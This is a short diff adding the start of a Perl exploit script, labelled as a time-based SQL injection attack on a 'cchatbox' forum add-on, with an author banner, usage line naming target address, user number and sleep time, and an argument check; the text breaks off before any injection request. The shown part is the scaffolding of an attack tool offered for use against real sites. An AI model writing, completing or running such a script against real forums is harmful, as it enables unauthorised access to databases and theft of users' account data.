@@ -1,0 +1,17 @@
+?#!/usr/bin/perl
+use LWP::UserAgent;
+$ua = LWP::UserAgent->new;
+$ua->agent("MyApp/0.1 ");
+print "##################################\n";
+print "############ EXPLOIT #############\n";
+print "##################################\n";
+print "## Portal: cchatbox             ##\n";
+print "## Bug: SQLI                    ##\n";
+print "## Author: DSecurity            ##\n";
+print "## Coder: vv0lll                ##\n";
+print "##################################\n";
+	
+print "Use: exploit.pl address number_user sleeptime\n";
+print "Example: exploit.pl http://localhost/vbb 10 10\n";
+if(@ARGV < 2) {exit;}
+print "\n\n=====
